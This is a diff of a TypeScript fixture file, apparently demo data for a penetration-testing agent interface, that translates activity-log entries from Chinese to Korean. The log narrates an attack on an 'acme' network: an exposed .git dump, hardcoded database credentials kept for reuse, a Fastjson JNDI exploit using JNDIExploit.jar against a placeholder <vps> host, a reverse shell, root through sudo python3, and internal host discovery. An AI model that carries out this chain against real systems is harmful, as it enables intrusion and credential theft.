@@ -2043,7 +2043,8 @@ export const activity: Activity[] = [
     intent_id: "ig",
     ts: T("2026-07-25T20:26:00Z"),
     kind: "thinking",
-    summary: "robots.txt 提到 /.git，先探测目录是否可下载，能拿源码就能白盒找注入点与硬编码密钥。",
+    summary:
+      "robots.txt 가 /.git 을 언급한다. 먼저 디렉터리를 내려받을 수 있는지 탐지하고, 소스 코드를 확보하면 화이트박스로 인젝션 지점과 하드코딩된 비밀 키를 찾을 수 있다.",
   },
   {
     seq: 311,
@@ -2064,7 +2065,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "tg1",
     summary: "200",
-    detail: ".git 目录对外可访问。",
+    detail: ".git 디렉터리가 외부에서 접근 가능하다.",
   },
   {
     seq: 313,
@@ -2084,8 +2085,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "tg2",
-    summary: "还原 214 个文件；HEAD=main。config.php / db.php 在列。",
-    detail: "完整后端源码已还原到 /tmp/acme。",
+    summary: "214개 파일을 복원했다; HEAD=main. config.php / db.php 가 목록에 있다.",
+    detail: "백엔드 소스 코드 전체를 /tmp/acme 에 복원했다.",
   },
   {
     seq: 315,
@@ -2106,7 +2107,8 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "tg3",
     summary: "$db_user='sa'; $db_pass='Acme@2021'; $db_host='10.10.10.30';",
-    detail: "硬编码数据库口令，且 host 指向内网 IP —— 记为疑似内网通用凭据。",
+    detail:
+      "데이터베이스 비밀번호가 하드코딩되어 있고, host 가 내부망 IP 를 가리킨다. 내부망 공용으로 추정되는 자격 증명으로 기록한다.",
   },
   {
     seq: 317,
@@ -2114,7 +2116,8 @@ export const activity: Activity[] = [
     intent_id: "ig",
     ts: T("2026-07-25T20:36:00Z"),
     kind: "result",
-    summary: "源码泄露 + 硬编码 DB 凭据确认，凭据入图供后续内网复用。",
+    summary:
+      "소스 코드 유출과 하드코딩 DB 자격 증명을 확인했고, 자격 증명을 그래프에 반영해 이후 내부망에서 재사용할 수 있게 한다.",
     input_tokens: 88000,
     output_tokens: 5200,
     cache_read_tokens: 60000,
@@ -2128,7 +2131,8 @@ export const activity: Activity[] = [
     intent_id: "i6",
     ts: T("2026-07-25T14:22:00Z"),
     kind: "thinking",
-    summary: "shop.acme.com 是自研电商，先指纹识别框架/组件版本，再对存在已知反序列化的组件下手。",
+    summary:
+      "shop.acme.com 은 자체 개발 전자상거래이므로, 먼저 프레임워크·컴포넌트 버전을 지문 식별한 뒤, 알려진 역직렬화 취약점이 있는 컴포넌트를 공략한다.",
   },
   {
     seq: 321,
@@ -2149,7 +2153,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t6a",
     summary: "X-Powered-By: Servlet\nSet-Cookie: JSESSIONID=...",
-    detail: "Java 技术栈，存在 /api/import 接受 JSON body。",
+    detail: "Java 기술 스택이며, JSON body 를 받는 /api/import 엔드포인트가 존재한다.",
   },
   {
     seq: 323,
@@ -2170,8 +2174,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t6b",
-    summary: "报错栈含 com.alibaba.fastjson.JSONException（1.2.24）",
-    detail: "确认 Fastjson 1.2.24 —— 对应 JdbcRowSetImpl JNDI 注入 RCE。",
+    summary: "오류 스택에 com.alibaba.fastjson.JSONException (1.2.24) 포함",
+    detail: "Fastjson 1.2.24 를 확인했고, 이는 JdbcRowSetImpl JNDI 인젝션 RCE 에 대응한다.",
   },
   {
     seq: 325,
@@ -2179,7 +2183,7 @@ export const activity: Activity[] = [
     intent_id: "i6",
     ts: T("2026-07-25T14:40:00Z"),
     kind: "result",
-    summary: "指纹命中 Fastjson 1.2.24，反序列化 RCE 面成立，交给利用意图。",
+    summary: "지문이 Fastjson 1.2.24 에 적중해 역직렬화 RCE 공격면이 성립했고, 익스플로잇 의도로 넘긴다.",
     input_tokens: 64000,
     output_tokens: 4100,
     cache_read_tokens: 42000,
@@ -2193,7 +2197,8 @@ export const activity: Activity[] = [
     intent_id: "i7",
     ts: T("2026-07-25T15:12:00Z"),
     kind: "thinking",
-    summary: "起一个 JNDI/LDAP 恶意服务，让 shop 反连加载执行 payload，先 dnslog 验证出网，再落反弹 shell。",
+    summary:
+      "JNDI/LDAP 악성 서비스를 하나 띄워 shop 이 역방향으로 연결해 payload 를 로드·실행하게 하고, 먼저 dnslog 로 외부 통신을 확인한 뒤 리버스 셸을 확보한다.",
   },
   {
     seq: 331,
@@ -2203,7 +2208,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t7a",
-    summary: "java -jar JNDIExploit.jar -i <vps> -l 1389 &  # 起 LDAP/HTTP 恶意服务",
+    summary: "java -jar JNDIExploit.jar -i <vps> -l 1389 &  # LDAP/HTTP 악성 서비스 기동",
   },
   {
     seq: 332,
@@ -2214,7 +2219,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t7a",
     summary: "LDAP Server started on 1389, HTTP on 8180",
-    detail: "恶意服务就绪。",
+    detail: "악성 서비스가 준비됐다.",
   },
   {
     seq: 333,
@@ -2235,8 +2240,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t7b",
-    summary: "LDAP 收到请求 → 加载 ReverseShell → nc 监听收到连接",
-    detail: "payload 成功触发。",
+    summary: "LDAP 가 요청을 수신 → ReverseShell 로드 → nc 리스너가 연결 수신",
+    detail: "payload 가 성공적으로 트리거됐다.",
   },
   {
     seq: 335,
@@ -2246,7 +2251,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t7c",
-    summary: "id; hostname -I  # 反弹 shell 内确认身份与网段",
+    summary: "id; hostname -I  # 리버스 셸 안에서 신원과 네트워크 대역 확인",
   },
   {
     seq: 336,
@@ -2257,7 +2262,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t7c",
     summary: "uid=33(www-data) gid=33 groups=33\n10.0.20.15 10.10.10.15",
-    detail: "www-data@dmz-web01，且第二网卡 10.10.10.x —— 已进入 DMZ 且贴内网。",
+    detail: "www-data@dmz-web01 이고, 두 번째 네트워크 카드가 10.10.10.x 다. DMZ 에 진입했고 내부망에 인접했다.",
   },
   {
     seq: 337,
@@ -2275,7 +2280,7 @@ export const activity: Activity[] = [
     intent_id: "i7",
     ts: T("2026-07-25T15:40:00Z"),
     kind: "result",
-    summary: "反序列化 RCE 拿到 www-data 反弹 shell，目标③立足点初步建立。",
+    summary: "역직렬화 RCE 로 www-data 리버스 셸을 확보했고, 목표 ③ 거점을 1차로 구축했다.",
     input_tokens: 132000,
     output_tokens: 8600,
     cache_read_tokens: 90000,
@@ -2289,7 +2294,8 @@ export const activity: Activity[] = [
     intent_id: "i8",
     ts: T("2026-07-25T16:02:00Z"),
     kind: "thinking",
-    summary: "www-data 权限有限，先做本地信息收集找提权点：sudo 配置、SUID、内核版本。",
+    summary:
+      "www-data 권한이 제한적이므로, 먼저 로컬 정보 수집으로 권한 상승 지점을 찾는다: sudo 설정, SUID, 커널 버전.",
   },
   {
     seq: 341,
@@ -2310,7 +2316,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t8a",
     summary: "User www-data may run: (ALL) NOPASSWD: /usr/bin/python3",
-    detail: "sudo 白名单里 python3 且免密 —— 直接可提权。",
+    detail: "sudo 화이트리스트에 python3 가 있고 비밀번호도 면제된다. 곧바로 권한 상승이 가능하다.",
   },
   {
     seq: 343,
@@ -2331,7 +2337,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t8b",
     summary: "uid=0(root) gid=0(root) groups=0(root)",
-    detail: "已提权 root。",
+    detail: "root 로 권한을 상승했다.",
   },
   {
     seq: 345,
@@ -2349,7 +2355,7 @@ export const activity: Activity[] = [
     intent_id: "i8",
     ts: T("2026-07-25T16:20:00Z"),
     kind: "result",
-    summary: "本地提权 root 完成，立足点稳固；准备以其为 pivot 打内网。",
+    summary: "로컬에서 root 권한 상승을 마쳐 거점이 공고해졌고, 이를 pivot 삼아 내부망을 공략할 준비를 한다.",
     input_tokens: 74000,
     output_tokens: 4700,
     cache_read_tokens: 50000,
@@ -2363,7 +2369,8 @@ export const activity: Activity[] = [
     intent_id: "i9",
     ts: T("2026-07-25T20:32:00Z"),
     kind: "thinking",
-    summary: "立足点直连 10.10.10.0/24，用 fscan/内网扫描做主机与端口发现，圈定域控与高价值主机。",
+    summary:
+      "거점이 10.10.10.0/24 에 직접 연결되므로, fscan·내부망 스캔으로 호스트·포트를 발견하고 도메인 컨트롤러와 고가치 호스트를 특정한다.",
   },
   {
     seq: 351,
@@ -2384,7 +2391,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t9a",
     summary: "DC01(10.10.10.10) 88/389/445\nFS01(10.10.10.5) 445\nJENKINS(10.10.10.20) 8080",
-    detail: "圈定域控 DC01、文件服务器 FS01、内部 Jenkins。",
+    detail: "도메인 컨트롤러 DC01, 파일 서버 FS01, 내부 Jenkins 를 특정했다.",
   },
   {
     seq: 353,
@@ -2392,7 +2399,7 @@ export const activity: Activity[] = [
     intent_id: "i9",
     ts: T("2026-07-25T21:00:00Z"),
     kind: "result",
-    summary: "内网主机发现完成，3 台高价值目标入图。",
+    summary: "내부망 호스트 발견을 완료했고, 고가치 대상 3대를 그래프에 반영했다.",
     input_tokens: 82000,
     output_tokens: 5100,
     cache_read_tokens: 56000,
